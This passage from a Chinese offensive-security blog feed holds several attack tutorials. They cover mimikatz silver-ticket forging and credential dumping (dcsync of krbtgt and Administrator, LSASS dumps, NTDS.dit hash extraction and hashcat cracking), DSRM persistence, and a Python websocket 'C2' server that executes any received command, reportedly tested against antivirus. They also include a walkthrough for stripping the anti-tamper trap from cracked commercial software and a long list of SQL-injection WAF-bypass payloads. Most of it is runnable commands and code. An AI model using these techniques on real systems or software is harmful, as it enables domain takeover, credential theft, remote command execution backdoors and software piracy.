</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line"></span><br><span class="line">此处要找到计算机账户，也就是Username : WIN-8VVLRPIAJB0$的NTLM hash，如果是其他账户，那么会失败,也就是需要共享服务账号。</span><br><span class="line"></span><br><span class="line">整理以上获得的信息如下：</span><br><span class="line"></span><br><span class="line">/domain:test.local</span><br><span class="line"></span><br><span class="line">/sid:S-1-5-21-4155807533-921486164-2767329826</span><br><span class="line"></span><br><span class="line">/target:WIN-8VVLRPIAJB0.test.local</span><br><span class="line"></span><br><span class="line">/service:cifs</span><br><span class="line"></span><br><span class="line">/rc4:d5304f9ea69523479560ca4ebb5a2155</span><br><span class="line"></span><br><span class="line">/user:silver</span><br><span class="line"></span><br><span class="line">使用mimikatz执行如下命令导入Silver Ticket</span><br><span class="line"></span><br><span class="line">mimikatz &quot;kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt&quot;</span><br><span class="line"></span><br><span class="line">如图，成功导入，此时可以成功访问域控上的文件共享</span><br></pre></td></tr></table></figure><p>8.提取各种密码和hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">用mimkatz提取密码和hash</span><br><span class="line">提取AD的哈希</span><br><span class="line">lsadumo::lsa /inject exit</span><br><span class="line">转储LSASS内存</span><br><span class="line">sekurlsa::minidump c:\temp\lsass.dmp</span><br><span class="line">提取KRBTGT用户账户的密码数据</span><br><span class="line">privilege::debug lsadump::dcsync /domain:域名     user:krbtgt exit</span><br><span class="line">管理员用户帐户提取密码数据：</span><br><span class="line">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator&quot; exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">从NTDS.DIT中提取哈希</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">提取出来的文件通过ntdsdump是无法提取的通过esedbexport来恢复。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">安装：</span><br><span class="line">wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz`</span><br><span class="line">apt-get install autoconf automake autopoint libtool pkg-config</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">ldconfig</span><br><span class="line">esedbexport -m tables ntds.dit</span><br><span class="line">大概需要（20-30分钟）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最后生成在./ntds.dit.export/</span><br><span class="line">使用ntdsxtract提取域信息</span><br><span class="line">git clone https://github.com/csababarta/ntdsxtract.git</span><br><span class="line">python setup.py build &amp;&amp; python setup.py install</span><br><span class="line">提取哈希:(这里需要将刚拷出来的三个文件中的系统复制到当前目录下）</span><br><span class="line">$ dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt</span><br><span class="line">这样提取出来之后已经是转换成hashcat可破解的格式</span><br><span class="line">hashcat -m 1000 ntout ./password.txt</span><br></pre></td></tr></table></figure><p>9.DSRM密码同步将域控权限持久化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">获取到域控权限后如何利用DSRM密码同步将域管权限持久化。</span><br><span class="line">Windows Server 2008需要安装KB961320补丁才能支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。</span><br><span class="line">KB961320</span><br><span class="line">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni</span><br><span class="line">巧用DSRM密码同步将域控权限持久化</span><br><span class="line">http://drops.xmd5.com/static/drops/tips-9297.html</span><br></pre></td></tr></table></figure><h2 id="0x02相关资料"><a href="#0x02相关资料" class="headerlink" title="0x02相关资料"></a>0x02相关资料</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SPN扫描</span><br><span class="line">https://adsecurity.org/?p=1508</span><br><span class="line">扫描SQLServer的脚本</span><br><span class="line">https://github.com/PyroTek3/PowerShell-AD-Recon</span><br><span class="line">Kerberos的黄金门票</span><br><span class="line">https://adsecurity.org/?p=1640</span><br><span class="line">域服务账号破解实践</span><br><span class="line">http://bobao.360.cn/learning/detail/3564.html</span><br><span class="line">Kerberos的认证原理</span><br><span class="line">http://blog.csdn.net/wulantian/article/details/42418231</span><br><span class="line">深刻理解windows安全认证机制ntlm＆Kerberos</span><br><span class="line">的Kerberos身份验证流程</span><br><span class="line">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</span><br><span class="line">敞开的地狱之门kerberons</span><br><span class="line">https://www.freebuf.com/articles/system/45631.html</span><br><span class="line">黄金票据的使用</span><br><span class="line">https://www.youtube.com/watch?v=eNbujcPn5c4</span><br><span class="line">白银票据的使用</span><br><span class="line">https://www.youtube.com/watch?v=jVqKVdBYPp0</span><br></pre></td></tr></table></figure><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第一个c2通信脚本</title>
      <link href="/posts/d6f76024.html"/>
      <url>/posts/d6f76024.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这几天在学校的实验室折腾c2通信。从一开始的不懂后面慢慢弄懂了，所谓的c2通信原理<br>是基于websocket上的操作。<br><img src="https://camo.githubusercontent.com/ed4690f37c4c7f83c5ba0ab669cc6d41ac9480f6/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30" alt="68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30"></p><h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p><b>原理：</b></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.控制器运行Web / WebSocket服务器以及命令行界面，允许攻击者为代理输入命令</span><br><span class="line">2.代理程序在受害者的计算机上运行并执行从C2接收的任何指令，与处理与C2服务器的所有通信的浏览器进程交互</span><br><span class="line">3.通过COM接口控制的浏览器进程（Internet Explorer / Edge）通过WebScoket通道处理代理与C2服务器之间的所有通信</span><br></pre></td></tr></table></figure><p><b>连接过程</b></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一种：</span><br><span class="line">1.创建websocket然后调用js进行连接</span><br><span class="line">2.将创建好的websocket放入到受害者机子</span><br><span class="line">3.本地调用js连接然后执行命令由受害者端接收到进行命令执行在返回给攻击者</span><br><span class="line"></span><br><span class="line">第二种：</span><br><span class="line">1.在肉鸡上创建websocket</span><br><span class="line">2.然后受害者连接，然后攻击者访问肉鸡执行命令</span><br><span class="line">3.受害者接收到执行命令，然后返回给肉鸡</span><br></pre></td></tr></table></figure><p><b>代码</b><br>服务端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">import websockets</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">async def hello(websocket,path):</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            name = await websocket.recv() #接收客户端的信息</span><br><span class="line">            zx=os.popen(name) #执行命令</span><br><span class="line">            await websocket.send(zx.read()) #返回给客户端</span><br><span class="line">    except Exception as r:</span><br><span class="line">        print(&apos;[-] Error &#123;&#125;&apos;.format(r))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_server=websockets.serve(hello,&apos;&#123;&#125;&apos;.format(sys.argv[1]),sys.argv[2]) #创建websocket</span><br><span class="line">asyncio.get_event_loop().run_until_complete(start_server) #异步</span><br><span class="line">asyncio.get_event_loop().run_forever()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Web sockets test&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;jquery-min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        var ws;</span><br><span class="line">        function ToggleConnectionClicked() &#123;          </span><br><span class="line">                try &#123;</span><br><span class="line">                    ws = new WebSocket(&quot;ws://IP:PORT&quot;);//连接服务器 （连接websocket服务器）</span><br><span class="line">                    ws.onopen = function(event)&#123;alert(&quot;已经与服务器建立了连接\r\n当前连接状 （连接成功后触发的事件）态：&quot;+this.readyState);&#125;;</span><br><span class="line">                    ws.onmessage = function(event)&#123;alert(&quot;接收到服务器发送的数据：\r\n&quot;+event.data);&#125;; （接收到数据触发的事件）</span><br><span class="line">                    ws.onclose = function(event)&#123;alert(&quot;已经与服务器断开连接\r\n当前连接状态：&quot;+this.readyState);&#125;;  //异常触发的事件</span><br><span class="line">                    ws.onerror = function(event)&#123;alert(&quot;WebSocket异常！&quot;);&#125;;</span><br><span class="line">                &#125; catch (ex) &#123;</span><br><span class="line">                    alert(ex.message);      </span><br><span class="line">                &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        function SendData() &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                var content = document.getElementById(&quot;content&quot;).value;</span><br><span class="line">                if(content)&#123;</span><br><span class="line">                    ws.send(content);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;catch(ex)&#123;</span><br><span class="line">                alert(ex.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        function seestate()&#123;</span><br><span class="line">            alert(ws.readyState);</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;button id=&apos;ToggleConnection&apos; type=&quot;button&quot; onclick=&apos;ToggleConnectionClicked();&apos;&gt;连接服务器&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">   &lt;textarea id=&quot;content&quot; &gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;button id=&apos;ToggleConnection&apos; type=&quot;button&quot; onclick=&apos;SendData();&apos;&gt;发送我的名字：beston&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;button id=&apos;ToggleConnection&apos; type=&quot;button&quot; onclick=&apos;seestate();&apos;&gt;查看状态&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><b>测试</b><br><img src="https://s1.ax1x.com/2018/12/14/FU1PvF.jpg" alt="FU1PvF.jpg"></p><p><img src="https://s1.ax1x.com/2018/12/14/FU1Fu4.md.png" alt="FU1Fu4.md.png"></p><p>在安有360的机子上进行测试：<br>视频:<a href="https://v.youku.com/v_show/id_XMzk2NDI2MjI0MA==.html?spm=a2hzp.8253869.0.0" target="_blank" rel="noopener">c2通信实现—其他—视频高清在线观看-优酷</a></p><p><b>一些c2的项目</b><br><a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noopener">GitHub - nettitude/PoshC2: Powershell C2 Server and Implants</a><br><a href="https://github.com/Arno0x/WSC2" target="_blank" rel="noopener">GitHub - Arno0x/WSC2: A WebSocket C2 Tool</a><br><b>参考文章</b><br><a href="https://arno0x0x.wordpress.com/2017/11/10/using-websockets-and-ie-edge-for-c2-communications/" target="_blank" rel="noopener">Using WebSockets and IE/Edge for C2 communications – arno0x0x</a></p><p>github地址：<a href="https://github.com/422926799/python/tree/master/c2%E9%A1%B9%E7%9B%AE" target="_blank" rel="noopener">python/c2项目 at master · 422926799/python · GitHub</a></p><p><b>后续开发的一些建议</b></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.实现以上说的方法</span><br><span class="line">2.加密传输</span><br></pre></td></tr></table></figure><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>去除淘小秘暗桩</title>
      <link href="/posts/51e4fe35.html"/>
      <url>/posts/51e4fe35.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一般的PE为了防止别人破解。都会给自己加上暗桩，你破解ok。但是我就把你电脑格盘重启蓝屏等等之类的东东…所以玩破解最好虚拟机里面搞。<br><img src="https://s1.ax1x.com/2018/12/09/FG9MPU.jpg" alt="FG9MPU.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>暗桩一般是在你破解完程序后出现的，比如淘小秘这个就是。将主控制窗口剥离出来后，发现无法打开<br><img src="https://s1.ax1x.com/2018/12/09/FG9wGD.png" alt="FG9wGD.png"><br>根据他自动退出的条件，然后载入自动退出的API断点，然后运行程序。<br><img src="https://s1.ax1x.com/2018/12/09/FG9BxH.png" alt="FG9BxH.png"><br>点击，最近的（第一个返回到xxx）。右键在反汇编窗口中显示调用<br><img src="https://s1.ax1x.com/2018/12/09/FG9yqI.png" alt="FG9yqI.png"><br>然后发现有个call，直接nop掉保存退出<br><img src="https://s1.ax1x.com/2018/12/09/FG9IMj.png" alt="FG9IMj.png"><br>Nop掉<br><img src="https://s1.ax1x.com/2018/12/09/FGC3Y8.png" alt="FGC3Y8.png"><br>发现可以成功打开<br><img src="https://s1.ax1x.com/2018/12/09/FGCBkV.md.png" alt="FGCBkV.md.png"></p><h3 id="得到的一些总结"><a href="#得到的一些总结" class="headerlink" title="得到的一些总结"></a>得到的一些总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果程序出现暗桩可以下程序退出的断点，获取用 其他办法</span><br><span class="line">在暗桩出现的地方暂停，去除暗桩即可</span><br></pre></td></tr></table></figure><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sql注入过防注入笔记</title>
      <link href="/posts/acb30657.html"/>
      <url>/posts/acb30657.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为当事人的能力不足，导致资源的浪费和损耗是因为自己的无能<br>                                                                                              —《金木，佐佐木 绯世》</p><p><img src="http://pic.netbian.com/uploads/allimg/171122/193119-15113502799113.jpg" alt="193119-15113502799113.jpg"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line">对参数名进行url编码</span><br><span class="line">http://127.0.0.1/sql.php?%69d=1</span><br><span class="line">对参数值进行url编码</span><br><span class="line">http://127.0.0.1/sql.php?id=1%20%61%6E%64%20%31%3D%32</span><br><span class="line">对参数值进行双重编码</span><br><span class="line">http://127.0.0.1/sql.php?id=1%25%32%30%25%36%31%25%36%45%25%36%34%25%32%30%25%33%31%25%33%44%25%33%32</span><br><span class="line">单引号的一些编码：</span><br><span class="line">%u0027</span><br><span class="line">%u02b9</span><br><span class="line">%u02bc</span><br><span class="line">%u02c8</span><br><span class="line">%u2032</span><br><span class="line">%uff07</span><br><span class="line">%c0%27</span><br><span class="line">%c0%a7</span><br><span class="line">%e0%80%a7</span><br><span class="line">星号的一些编码：</span><br><span class="line">%u002a</span><br><span class="line">%uff0a</span><br><span class="line">%c0%2a</span><br><span class="line">%c0%aa</span><br><span class="line">%e0%80%aa</span><br><span class="line">使用 Mysql 内置函数 char（）。示例代码:</span><br><span class="line">char(114)=&apos;r&apos;</span><br><span class="line">1.3 使用 Mysql 内置函数 HEX（）,UNHEX(). ,UNHEX(). ,UNHEX(). ,UNHEX().示例代码：</span><br><span class="line">通过 str 获取 hex 值:</span><br><span class="line">select hex(&quot;root&quot;) 返回结果:726F6F74</span><br><span class="line">通过 hex 获取 str:</span><br><span class="line">select unhex( &quot;726F6F74&quot; ) 返回结果: root</span><br><span class="line">比如:当关键字 root 被过滤时可以用 0x726F6F74 代替 root</span><br><span class="line">base64变形注入，通过base64编码引发的注入</span><br><span class="line">http://127.0.0.1/sql.php?id=1</span><br><span class="line">http://127.0.0.1/sql.php?id=MSBhbmQgMT0y</span><br><span class="line">判断注入点的姿势</span><br><span class="line">id=1+OR+0x50=0x50</span><br><span class="line">id=1+and+5!=6</span><br><span class="line">And 0 (false)</span><br><span class="line">And 1 (true)</span><br><span class="line">And (true)</span><br><span class="line">And (false)</span><br><span class="line">&apos;/*!or*/1=&apos;1</span><br><span class="line">or 1=1;%00</span><br><span class="line">and 1=1</span><br><span class="line">&amp;&amp;2=2</span><br><span class="line">or 3=3</span><br><span class="line">Xor 4=4</span><br><span class="line">Xor 5 LIKE 5</span><br><span class="line">or 6 rLiKE 6</span><br><span class="line">|| 3&gt;2</span><br><span class="line">&amp;&amp; 3&lt;7</span><br><span class="line">AnD is null</span><br><span class="line">AnD is not null</span><br><span class="line">and &apos;0having&apos;=&apos;0having&apos;</span><br><span class="line">and 1=&apos;1</span><br><span class="line"></span><br><span class="line">替换空格</span><br><span class="line">/**/</span><br><span class="line">+</span><br><span class="line">%20</span><br><span class="line">&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;,</span><br><span class="line">&apos;%0A&apos;</span><br><span class="line">--%0A</span><br><span class="line">%23%0A</span><br><span class="line">%23PTTmJopxdWJ%0A</span><br><span class="line">%23cWfcVRPV%0A</span><br><span class="line">‘or+(1)sounds/**/like“1“–%a0-</span><br><span class="line">‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#</span><br><span class="line">(0)union(select(table_name),column_name,…</span><br><span class="line">0%a0union%a0select%09group_concat(table_name)….</span><br><span class="line">?id=(case(substr((select(group_concat(table_name))from(information_schema.tables)),1,1))when(</span><br><span class="line">0x61)then(1)else(2)end)</span><br><span class="line">?id=(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((tab</span><br><span class="line">le_name)like(0x7573657273)))#</span><br><span class="line">?id=if((select(count(*))from(information_schema.columns))=187,1,2)</span><br><span class="line">用过多个空格替换&quot; &quot;=&gt;&quot; &quot;</span><br><span class="line">用%bf%27 代替单引号</span><br><span class="line">PostgreSQL 可以用$$代替单引号来突破防注入</span><br><span class="line">可以达到相似目的的 Mysql 函数</span><br><span class="line">substring() mid() substr()</span><br><span class="line">ascii() hex() bin() ord()</span><br><span class="line">benchmark() sleep()</span><br><span class="line"></span><br><span class="line">没有where如何注入：</span><br><span class="line">源语句：select user from users where user=&quot;admin&quot;;</span><br><span class="line">没有where语句：select user from users group by user having user=&quot;admin&quot;;</span><br><span class="line">没有union：</span><br><span class="line">and (select passfrom userslimit 1)=’secret</span><br><span class="line">And exists (select * fromuser limit 1)=’admin</span><br><span class="line">没有limit</span><br><span class="line"> select pass from users where 1</span><br><span class="line"> 没有group</span><br><span class="line"> select substr(user,1) from users //直接爆出全部内容</span><br><span class="line"> select 